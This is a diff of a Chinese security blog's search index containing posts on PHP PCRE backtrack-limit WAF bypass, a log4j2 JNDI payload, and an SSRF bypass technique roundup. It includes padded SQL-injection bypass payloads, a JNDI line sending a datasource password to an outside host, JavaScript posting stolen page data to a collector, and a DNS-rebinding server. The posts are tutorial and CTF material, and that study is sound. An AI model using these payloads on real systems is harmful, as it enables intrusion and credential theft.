+<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
+
+<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
+
+<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
+
+<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
+<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>当回溯次数大于1000000会有什么问题呢？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
+
+<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
+<p><strong>修复方法</strong></p>
+<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
   <entry>
@@ -404,6 +335,83 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//jndi.fuzz.red:5/ku8r/$&#123;bundle:application:spring.datasource.password&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220302220853565.png" class="" title="image-20220302220853565">
+]]></content>
+  </entry>
+  <entry>
+    <title>SSRF绕过姿势汇总</title>
+    <url>/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h2 id="1-符号绕过"><a href="#1-符号绕过" class="headerlink" title="1. @符号绕过"></a>1. @符号绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
+<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
+<h2 id="2-点分隔符替换"><a href="#2-点分隔符替换" class="headerlink" title="2. 点分隔符替换"></a>2. 点分隔符替换</h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-本地回环地址"><a href="#3-本地回环地址" class="headerlink" title="3. 本地回环地址"></a>3. 本地回环地址</h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure>
+
+<p>IPV6</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-DNS解析"><a href="#4-DNS解析" class="headerlink" title="4. DNS解析"></a>4. DNS解析</h2><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>
+
+<p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-IP的进制转换"><a href="#5-IP的进制转换" class="headerlink" title="5. IP的进制转换"></a>5. IP的进制转换</h2><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
+<h2 id="6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="6. 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>6. 封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-利用网址缩短"><a href="#7-利用网址缩短" class="headerlink" title="7. 利用网址缩短"></a>7. 利用网址缩短</h2><p>网上有很多将网址转换未短网址的网站。</p>
+<ul>
+<li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+<h2 id="8-利用30X重定向"><a href="#8-利用30X重定向" class="headerlink" title="8. 利用30X重定向"></a>8. 利用30X重定向</h2><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
+<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
+<p>服务端代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="9-DNS重绑定-DNS-Rebinding"><a href="#9-DNS重绑定-DNS-Rebinding" class="headerlink" title="9. DNS重绑定(DNS Rebinding)"></a>9. DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p>
+<p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p>
+<p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p>
+<h3 id="9-1-TTL-0的A记录"><a href="#9-1-TTL-0的A记录" class="headerlink" title="9.1 TTL=0的A记录"></a>9.1 TTL=0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL=0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p>
+<p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p>
+<p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>整个过程如下：</p>
+<ol>
+<li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li>
+<li>设置你的域名的TTL=0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li>
+<li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li>
+<li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL=0，所以又会重新向dns服务器请求一次ip。得到ip=127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li>
+</ol>
+<h3 id="9-2-两条A记录"><a href="#9-2-两条A记录" class="headerlink" title="9.2 两条A记录"></a>9.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1/4。</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/586e317cb6a56d3762000002.png" class="" title="img">
+
+<p>这种方法推荐使用<a class="link"   href="http://ceye.io/dns-rebinding" >ceye.io<i class="fas fa-external-link-alt"></i></a>创建，在个人信息页新增DNS解析IP就可以</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220319192958158.png" class="" title="image-20220319192958158">
+
+<p>多nslookup下自己<code>abcdef.ceye.io</code>的子域名，比如如<code>nslookup r.abcdef.ceye.io</code></p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220319193310416.png" class="" title="image-20220319193310416">
+
+
+
+<h3 id="9-3-NS记录-自建DNS服务器"><a href="#9-3-NS记录-自建DNS服务器" class="headerlink" title="9.3 NS记录+自建DNS服务器"></a>9.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161403319.png" class="" title="image-20220112161403319">
+
+<p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span>(<span class="params">self, query</span>):</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">&quot;149.248.18.38&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> name+<span class="string">&quot; ===&gt; &quot;</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            <span class="built_in">type</span>=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b&#x27;%s&#x27;</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">self, query, timeout=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">&#x27;/etc/resolv.conf&#x27;</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+
+<p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p>
+<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161740821.png" class="" title="image-20220112161740821">
+
+<p><strong>参考链接</strong></p>
+<p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
   <entry>
